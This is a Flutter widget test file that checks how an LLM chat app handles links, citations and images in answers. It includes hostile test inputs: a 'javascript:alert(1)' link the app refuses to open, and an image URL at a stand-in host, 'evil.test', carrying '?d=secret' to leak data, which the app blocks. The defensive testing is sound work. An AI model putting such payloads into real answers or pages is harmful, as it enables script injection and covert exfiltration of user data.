import 'package:anywherellm/core/server_models.dart';
import 'package:anywherellm/ui/state/notice.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter_test/flutter_test.dart';

import '../support/fake_api.dart';
import '../support/pixels.dart';
import '../support/pump.dart';

/// Taps the middle of the link whose text is [text] in an answer, selectable or not, as a
/// person does.
Future<void> tapLink(WidgetTester tester, String text) async {
  for (final element in find.byType(RichText).evaluate()) {
    final start = (element.widget as RichText).text.toPlainText().indexOf(text);
    final paragraph = element.renderObject;
    if (start < 0 || paragraph is! RenderParagraph) continue;
    final box = paragraph
        .getBoxesForSelection(
          TextSelection(baseOffset: start, extentOffset: start + text.length),
        )
        .first
        .toRect();
    await tester.tapAt(paragraph.localToGlobal(box.center));
    await tester.pump(const Duration(milliseconds: 500));
    return;
  }
  for (final element in find.byType(SelectableText).evaluate()) {
    final selectable = element.widget as SelectableText;
    final start = selectable.textSpan?.toPlainText().indexOf(text) ?? -1;
    if (start < 0) continue;
    final editable = tester
        .state<EditableTextState>(
          find.descendant(
            of: find.byWidget(selectable),
            matching: find.byType(EditableText),
          ),
        )
        .renderEditable;
    final box = editable
        .getBoxesForSelection(
          TextSelection(baseOffset: start, extentOffset: start + text.length),
        )
        .first
        .toRect();
    await tester.tapAt(editable.localToGlobal(box.center));
    await tester.pump(const Duration(milliseconds: 500));
    return;
  }
  fail('no link "$text"');
}

void main() {
  testWidgets('a link in an answer opens in the browser', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Read [the report](https://example.com/report) today.'),
    );
    await tapLink(tester, 'the report');
    expect(h.opened, [Uri.parse('https://example.com/report')]);
    expect(h.chat.linkNotice, isNull);
  });

  testWidgets('a link the app will not open says so', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Click [here](javascript:alert(1)) now.'),
    );
    await tapLink(tester, 'here');
    expect(h.opened, isEmpty);
    expect(h.chat.linkNotice?.title, 'Could not open the link');
    expect(h.chat.linkNotice?.text, contains('javascript: links'));
    expect(h.chat.linkNotice?.text, isNot(contains('alert')));
    expect(find.text('Could not open the link'), findsOneWidget);
    // It has no timer: it stays until it is closed.
    await tester.pump(const Duration(minutes: 1));
    expect(h.chat.linkNotice, isNotNull);
    await tester.tap(control('Close'));
    await tester.pumpAndSettle();
    expect(h.chat.linkNotice, isNull);
    expect(find.text('Could not open the link'), findsNothing);
  });

  testWidgets('a link notice shows beside a server problem, not over it', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Click [here](javascript:alert(1)) now.'),
    );
    h.chat.problem = const Notice('Could not read the workspaces', 'Down.');
    await tapLink(tester, 'here');
    expect(find.text('Could not read the workspaces'), findsOneWidget);
    expect(find.text('Could not open the link'), findsOneWidget);
    await tester.pump(const Duration(seconds: 6));
    expect(h.chat.problem?.title, 'Could not read the workspaces');
  });

  testWidgets('an opener that throws an error gives the notice', (
    tester,
  ) async {
    final h = await pumpApp(
      tester,
      llm: answering('Read [the report](https://example.com/report).'),
    );
    h.openThrows = ArgumentError('unsupported');
    await tapLink(tester, 'the report');
    expect(h.chat.linkNotice?.text, contains('Nothing on this device opened'));
    await tester.pump(const Duration(seconds: 6));
  });

  testWidgets('a link nothing on the device opens says so', (tester) async {
    final h = await pumpApp(
      tester,
      llm: answering('Mail [me](mailto:ada@example.com).'),
    );
    h.openSucceeds = false;
    await tapLink(tester, 'me');
    expect(h.opened, [Uri.parse('mailto:ada@example.com')]);
    expect(h.chat.linkNotice?.text, contains('Nothing on this device opened'));
    await tester.pump(const Duration(seconds: 6));
  });

  testWidgets(
    'a web citation opens its page; a file one lights up in Sources',
    (tester) async {
      final h = await pumpApp(
        tester,
        llm: answering(
          'Done.',
          cited: [
            Citation('A story', url: Uri.parse('https://news.test/story')),
            const Citation('Q3 roadmap.pdf'),
          ],
        ),
        // Room for both chips with readable names in the test font, whose glyphs are an em wide.
        size: const Size(480, 844),
      );
      await tester.tap(control('Source 1: A story, opens in the browser'));
      await tester.pump();
      expect(h.opened, [Uri.parse('https://news.test/story')]);
      await tester.tap(control('Source 2: Q3 roadmap.pdf'));
      await tester.pump();
      expect(h.opened, hasLength(1));
      expect(h.sources.flashed, isNotNull);
      await tester.pumpAndSettle(const Duration(seconds: 2));
    },
  );

  testWidgets('an image loads only from the server\'s own host', (
    tester,
  ) async {
    final llm = answering(
      'Card:\n\n[![Report](https://h:8080/card.png)](https://h:8080/r)\n\n'
      'Elsewhere: ![tracker](https://evil.test/p.png?d=secret)',
    )..images[Uri.parse('https://h:8080/card.png')] = pixel;
    await pumpApp(tester, llm: llm);
    await tester.pumpAndSettle();
    expect(find.byType(Image), findsOneWidget);
    expect(find.text('[tracker: evil.test]'), findsOneWidget);
    expect(llm.calls.where((c) => c.startsWith('answerImage')), [
      'answerImage:https://h:8080/card.png',
    ]);
  });

  testWidgets('a card written from the root loads and opens on the server', (
    tester,
  ) async {
    final llm = answering(
      'Done.\n\n[![Example](/files/3kQ-card.jpg?v=1)](/files/3kQ.html)',
    )..images[Uri.parse('https://h:3001/files/3kQ-card.jpg?v=1')] = pixel;
    final h = await pumpApp(tester, llm: llm);
    await tester.pumpAndSettle();
    expect(find.byType(Image), findsOneWidget);
    // The test's one-pixel picture is drawn at no size, so the link around it is tapped as
    // its gesture would.
    tester
        .widget<GestureDetector>(
          find
              .ancestor(
                of: find.byType(Image),
                matching: find.byType(GestureDetector),
              )
              .first,
        )
        .onTap!();
    await tester.pump(const Duration(milliseconds: 500));
    expect(h.opened, [Uri.parse('https://h:3001/files/3kQ.html')]);
    expect(h.chat.linkNotice, isNull);
  });
}
